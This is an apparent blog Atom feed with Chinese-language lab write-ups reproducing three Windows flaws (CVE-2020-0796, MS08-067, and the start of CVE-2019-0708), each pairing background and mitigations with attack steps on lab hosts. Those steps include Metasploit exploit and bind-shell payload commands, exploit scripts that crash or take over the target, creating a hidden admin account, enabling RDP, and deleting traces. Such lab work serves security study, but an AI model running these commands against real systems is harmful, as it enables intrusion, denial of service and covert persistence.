<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-05-28T06:37:48.995Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-0796漏洞复现及防御机制</title>
    <link href="http://example.com/posts/df5ab46f.html"/>
    <id>http://example.com/posts/df5ab46f.html</id>
    <published>2022-05-27T14:04:19.047Z</published>
    <updated>2022-05-28T06:37:48.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞描述"><a href="#1-1-漏洞描述" class="headerlink" title="1.1 漏洞描述"></a>1.1 漏洞描述</h2><p>CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。</p><span id="more"></span><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>在微软SMBv3远程代码执行漏洞中，SMB 3.1.1协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。</p><p>该漏洞存在于Windows的SMBv3.0(文件共享与打印服务)中，利用的端口是445。当SMBv3.0处理恶意制作的压缩数据包时，由于SMB没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的供给者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。</p><p>根据安全研究人员分析，该漏洞是一个整数溢出，发生在SMB服务驱动srv2.sys的<code>Srv2DecompressData()</code>函数中。</p><p>详细请看：</p><p><a href="https://nosec.org/home/detail/4420.html">https://nosec.org/home/detail/4420.html</a></p><p><a href="https://blog.csdn.net/weixin_44058342/article/details/105275847">https://blog.csdn.net/weixin_44058342/article/details/105275847</a></p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://www.cnblogs.com/goabout2/p/12609810.html">https://www.cnblogs.com/goabout2/p/12609810.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>漏洞主要影响Windows 10版本（1903和1909），包括32位、64位的家用版、专业版、企业版、教育版。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>微软SMBv3(Server Message Block 3.0)服务远程代码执行漏洞(CVE-2020-0796)可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被WannaCry等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office文档等多种方式触发漏洞进行攻击，对存在该漏洞的Windows主机造成严重威胁。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796: 高危</span><br></pre></td></tr></table></figure><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 10 Version 1903 x64 教育版（IP地址：192.168.193.142 / 192.168.193.143）</p><p>利用工具：</p><ul><li>MSF</li><li>Windows平台漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></li><li>Linux平台漏洞检测工具：<a href="https://github.com/joaozietolie/CVE-2020-0796-Checker">https://github.com/joaozietolie/CVE-2020-0796-Checker</a></li><li>本地EXP提权：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></li><li>POC蓝屏攻击： <a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li><li>RCE poc：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></li></ul><h2 id="2-2-复现准备"><a href="#2-2-复现准备" class="headerlink" title="2.2 复现准备"></a>2.2 复现准备</h2><p>检查靶机中的445端口是否已经打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/undefined/2.2.1.png" class="" title="检查445端口"><p>如果没有打开，在Windows 防火墙中添加入站规则，开启端口445。</p><p>开启文件共享，否则Kali用nmap扫描时不会探测到靶机开启了445端口。</p><img src="/posts/undefined/2.2.3.png" class="" title="开启文件共享"><img src="/posts/undefined/2.2.2.png" class="" title="开启文件共享"><h2 id="2-3-复现过程"><a href="#2-3-复现过程" class="headerlink" title="2.3 复现过程"></a>2.3 复现过程</h2><h3 id="2-3-1-本地提权"><a href="#2-3-1-本地提权" class="headerlink" title="2.3.1 本地提权"></a>2.3.1 本地提权</h3><p>使用奇安信检测CVE-2020-0796漏洞工具，它适用于局域网批量检测，快速查找未打补丁的主机。</p><img src="/posts/undefined/2.3.1.png" class="" title="检测漏洞"><p>使用本地EXP提权，下载下来是VS的一个工程文件，需要利用VS编译生成EXE文件。</p><p>查看当前用户，是普通用户，运行<code>cve-2020-0796-local.exe</code>后弹出另一个cmd窗口，在那个cmd窗口下的用户已经变成管理员了。</p><img src="/posts/undefined/2.3.2.png" class="" title="本地提权"><h3 id="2-3-2-蓝屏攻击"><a href="#2-3-2-蓝屏攻击" class="headerlink" title="2.3.2 蓝屏攻击"></a>2.3.2 蓝屏攻击</h3><p>使用Linux平台CVE-2020-0796漏洞检测工具检查靶机是否存在该漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash CVE-2020-0796-Checker.sh -t 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/undefined/2.3.3.png" class="" title="检测漏洞"><p>确认存在该漏洞后，使用POC蓝屏攻击脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/undefined/2.3.5.png" class=""><p>靶机成功蓝屏：</p><img src="/posts/undefined/2.3.4.png" class="" title="靶机蓝屏"><h3 id="2-3-3-远程登录"><a href="#2-3-3-远程登录" class="headerlink" title="2.3.3 远程登录"></a>2.3.3 远程登录</h3><p>RCE(remote command/code excute)，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>利用MSF生成Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=1234 -f py -o smb.py</span><br></pre></td></tr></table></figure><img src="/posts/undefined/2.3.7.png" class="" title="生成payload"><p>将Payload里的<code>buf</code>变量更名为<code>USER_PAYLOAD</code>，再将RCE poc中的<code>exploit.py</code>中的<code>USER_PAYLOAD</code>的值更换成Payload中的值。</p><p>给<code>exploit.py</code>增加执行权限，执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit.py</span><br><span class="line">python3 exploit.py -ip 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/undefined/2.3.6.png" class="" title="运行exploit"><p>利用MSF开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.193.143</span><br><span class="line">set lport 1234</span><br><span class="line">show options#查看还有没有参数没有设置的</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>结果运行到这里一直卡住：</p><img src="/posts/undefined/2.3.8.png" class="" title="运行卡住"><p><strong>不知道什么问题，运行了很多次仍然卡在这。</strong></p><p>实现远程登录后再通过本地提权，可以拿到靶机的管理员权限。</p><h1 id="3-防御方法"><a href="#3-防御方法" class="headerlink" title="3. 防御方法"></a>3. 防御方法</h1><ul><li><p>安装补丁。</p></li><li><p>根据BleepComputer的说法，尽管微软并未共享禁用SMBv3压缩的官方方法，但是Foregenix Solutions架构师Niall Newman在分析了Srv2.sys文件后可以通过手动修改注册表，防止被黑客远程攻击。</p><ul><li><p>在注册表“HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”建立一个名为<code>DisableCompression</code>的DWORD，值为1，禁止SMB的压缩功能。</p></li><li><p>或在管理员模式启动PowerShell，输入以下命令，执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure></li></ul></li><li><p>若无业务需要，在网络安全域边界防火墙封堵文件打印和共享端口TCP 135/139/445以缓解此问题。</p></li><li><p>可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞描述&quot;&gt;&lt;a href=&quot;#1-1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞描述&quot;&gt;&lt;/a&gt;1.1 漏洞描述&lt;/h2&gt;&lt;p&gt;CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS08-067漏洞复现及防御机制</title>
    <link href="http://example.com/posts/fa648f2b.html"/>
    <id>http://example.com/posts/fa648f2b.html</id>
    <published>2022-05-25T01:02:44.954Z</published>
    <updated>2022-05-28T00:30:27.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</p><span id="more"></span><p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的<code>NetPathCanonicalize()</code>函数时触发的。<code>NetPathCanonicalize()</code>函数在远程访问其它主机时，会调用<code>NetpwPathCanonicalize()</code>函数，对远程访问的路径进行规范化，而在<code>NetpwPathCanonicalize()</code>函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p><p>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。</p><p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p><p>详细请看：</p><p><a href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a> </p><p><a href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></p><p><a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>它影响了某些旧版本的Windows系统，包括：Windows 2000 、Windows XP 、Windows Server 2003。</p><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-常见的端口"><a href="#2-1-常见的端口" class="headerlink" title="2.1 常见的端口"></a>2.1 常见的端口</h2><img src="/posts/fa648f2b/2.1.1.jpg" class="" title="常见的端口"><p>黑客通过端口可以做信息收集、目标探测、服务判断、系统判断、角色分析。</p><h2 id="2-2-445端口"><a href="#2-2-445端口" class="headerlink" title="2.2 445端口"></a>2.2 445端口</h2><p>135、137、138、139和445端口都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p><p>445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p><p>总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest 帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p><p>利用工具：MSF</p><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>打开Windows Server 2003，确定445端口开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/2.2.1.png" class="" title="查看是否开启445端口"><p>关闭Win 2003系统的防火墙：</p><img src="/posts/fa648f2b/2.2.2.png" class="" title="关闭系统防火墙"><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>利用nmap扫描靶机的端口及确认该漏洞是否存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -p 445 --script smb-vuln-ms08-067 192.168.193.132 --open</span><br></pre></td></tr></table></figure><ul><li>-n：不要进行DNS解析</li><li>-p：后接端口号</li><li>—script：使用脚本进行扫描</li><li>—open：仅显示打开（或可能打开）的端口</li></ul><p>nmap漏扫脚本目录默认为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示漏洞存在且可以利用。</p><img src="/posts/fa648f2b/3.3.1.png" class="" title="扫描目标靶机的端口及确认该漏洞是否存在"><p>当然，我们一开始肯定不知道这么多信息，还不会用这么长的命令，那我们可以先确定靶机开放的端口和版本号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.193.132</span><br></pre></td></tr></table></figure><ul><li>-sV：探测打开的端口以确定服务/版本信息</li><li>-Pn：将所有主机视为在线，也就是跳过主机发现</li></ul><img src="/posts/fa648f2b/3.3.2.png" class="" title="探测打开的端口以确定服务&#x2F;版本信息"><p>做安全行业的，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。要是实在不知道，那我们还可以查百度嘛。</p><p>进入MSF，搜索MS08-067，这些步骤都在 <a href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708</a> 都讲过，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08-067</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.3.png" class="" title="搜索MS08-067"><p>查找到一个漏洞利用模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">show targets</span><br></pre></td></tr></table></figure><p>查看选项，缺少rhosts，所以要设置靶机IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.193.132 </span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.4.png" class="" title="设置靶机IP"><p>查看目标，找到与靶机匹配的信息。刚才我们已经用nmap -sV知道靶机是Windows Server 2003系统，但还是不知道具体信息（<strong>所以这种情况怎么才能知道具体信息？</strong>）。由于我知道靶机是Win 2003 SP2的，所以直接选目标74，如果实在没有更多信息那设置为自动目标(0)就好。</p><img src="/posts/fa648f2b/3.3.7.png" class="" title="设置target"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 74</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.5.png" class="" title="成功提权"><p>成功控制住靶机。我们可以用Linux或Windows窗口命令查看靶机的基本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig#查看IP地址</span><br><span class="line">pwd#查看当前所在位置</span><br><span class="line">sysinfo#查看操作系统信息</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.9.png" class="" title="成功提权"><img src="/posts/fa648f2b/3.3.10.png" class="" title="成功提权"><p>后来做了set target 0的实验，MSF会自动检测系统版本并选择目标，但它默认选择English版本，这可能是没有成功建立会话的原因之一。</p><img src="/posts/fa648f2b/3.3.16.png" class="" title="提权失败"><p>此时将它修改为74也不行了，提示我们“这很可能意味着先前的攻击尝试导致服务崩溃”。</p><img src="/posts/fa648f2b/3.3.17.png" class="" title="提权失败"><p>如果多run几次还会导致Win 2003系统内存溢出错误。</p><img src="/posts/fa648f2b/3.3.18.png" class="" title="内存溢出错误"><p>这种情况好像只能等靶机重新开机，才能利用前几次攻击失败的经验继续渗透。</p><h3 id="3-3-1-创建文件"><a href="#3-3-1-创建文件" class="headerlink" title="3.3.1 创建文件"></a>3.3.1 创建文件</h3><p>尝试在靶机上创建文件夹和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hacker</span><br><span class="line">cd hacker</span><br><span class="line">shell#进入靶机命令窗口</span><br><span class="line">echo v5le0n9&gt;test.txt</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.6.png" class="" title="在靶机创建目录"><img src="/posts/fa648f2b/3.3.8.png" class="" title="在靶机创建目录"><h3 id="3-3-2-创建用户"><a href="#3-3-2-创建用户" class="headerlink" title="3.3.2 创建用户"></a>3.3.2 创建用户</h3><p>Windows DOM用户常用命令如下：</p><ul><li><strong>net user abcd 1234 /add</strong><br>新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</li><li><strong>net user abcd /del</strong><br>将用户名为abcd的用户删除</li><li><strong>net user abcd /active:no</strong><br>将用户名为abcd的用户禁用</li><li><strong>net user abcd /active:yes</strong><br>激活用户名为abcd的用户</li><li><strong>net user abcd</strong><br>查看用户名为abcd的用户的情况</li><li><strong>net localgroup administrators abcd /add</strong><br>将abcd账户给予管理员权限</li></ul><p>创建一个名为v5le0n9，密码为123456的普通用户，给予管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 123456 /add#增加普通用户</span><br><span class="line">net localgroup administrators v5le0n9 /add#提升管理员权限</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.11.png" class="" title="提升管理员权限"><p>在Win 2003中能看到新创建了一个用户v5le0n9。</p><img src="/posts/fa648f2b/3.3.13.png" class="" title="提升管理员权限"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat# 开启远程连接</span><br><span class="line">netstat -an# 查看网络端口</span><br><span class="line">rdesktop 192.168.193.132# 远程连接</span><br></pre></td></tr></table></figure><p>开启远程连接3389端口，使用Kali远程登录靶机。</p><img src="/posts/fa648f2b/3.3.12.png" class="" title="开启远程连接3389端口"><p>最后一定要把我们新建的用户名删除，假装没来过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 /del</span><br></pre></td></tr></table></figure><p>虽然不能远程登录了，但靶机<code>C:\Documents and Settings</code>目录下还是有v5le0n9文件夹，<strong>怎么删不掉呢？！</strong></p><img src="/posts/fa648f2b/3.3.15.png" class="" title="删除用户名"><img src="/posts/fa648f2b/3.3.14.png" class="" title="删除用户名"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>关闭相关端口、安装杀毒软件和补丁</li><li>在防火墙中进行流量监测，主要是针对数据包中存在的形如“\ ** \ … \ … \ *”这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞概述&quot;&gt;&lt;/a&gt;1.1 漏洞概述&lt;/h2&gt;&lt;p&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708漏洞复现及防御机制</title>
    <link href="http://example.com/posts/2d03ac3f.html"/>
    <id>http://example.com/posts/2d03ac3f.html</id>
    <published>2022-05-24T07:28:42.637Z</published>
    <updated>2022-05-28T01:02:02.226Z</updated>
    
    <content type="html"><![CDATA[<p>终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。</p><span id="more"></span><h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的Windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年的 WannaCry 恶意软件的传播方式类似，成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>存在漏洞的远程桌面服务器，在接收到特殊数据包时会释放一个内部信道 MS_T120 的控制结构体，但并未将指向该结构体的指针删除，而且在远程桌面连接结束之后还会调用 MS_T120 结构体内的一个函数指针，若攻击者可通过远程发送数据重新占据被释放的 MS_T120，并为结构体内的函数指针赋恰当的值，即可实现远程命令执行。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>该漏洞影响旧版本的Windows系统，包括：Windows 7 、 Windows Server 2008 R2 、 Windows Server 2008 、Windows 2003 、 Windows XP。</p><p>Windows 8 和 Windows 10及之后版本不受此漏洞影响。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>CVE-2019-0708漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。如果被攻击者利用，会导致服务器被入侵，中病毒，像 WannaCry 永恒之蓝漏洞一样大规模的感染。若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-0708: 高危</span><br></pre></td></tr></table></figure><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-RDP协议"><a href="#2-1-RDP协议" class="headerlink" title="2.1 RDP协议"></a>2.1 RDP协议</h2><p>远程显示协议(Remote Display Protocol，RDP)，提供了客户和服务器之间的连接。</p><p>RDP是微软终端服务应用的协议，服务端基于Win 2000 / Win NT。协议基于T.128（T.120协议族）提供多通道通信。在客户端支持多种资源缓冲和图片数据的压缩处理，运用RDP协议的虚拟化平台有VMware、Microsoft等。</p><p>终端服务使任何一台有权限的终端机，用已知的账号登录服务器，可以使用账号内的资源，包括软件，硬件资源；同时，在协议升级后，客户端连接后可以使用本地的资源，包括本地打印机、声音本地回放，本地磁盘资源和本地硬件接口。所有的计算都在服务器端进行，客户端只需要处理网络连接、接收数据、界面显示和设备数据输出。</p><h2 id="2-2-专业术语"><a href="#2-2-专业术语" class="headerlink" title="2.2 专业术语"></a>2.2 专业术语</h2><ul><li>POC(Proof of Concept)：观点证明，用来证明漏洞存在的。简单来说是用来证明一段漏洞的代码，它是无害的。</li><li>EXP(Exploit)：漏洞利用，是指利用系统漏洞进行攻击的动作。</li><li>Payload：有效载荷，指的是Exploit执行成功之后，在系统中进行恶意操作的代码或者指令。</li><li>Shellcode：简单翻译就是shell代码，是payload的一种，因为建立正反shell而得名。Shellcode是一段利用软件漏洞执行的代码，Shellcode为16进制的机器码， 可在寄存器eip溢出后，塞入一段让CPU执行的Shellcode机器码，让电脑可以执行攻击者的任意指令。</li></ul><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 7  x86 旗舰版（IP地址：192.168.193.140）、Windows 7  x64 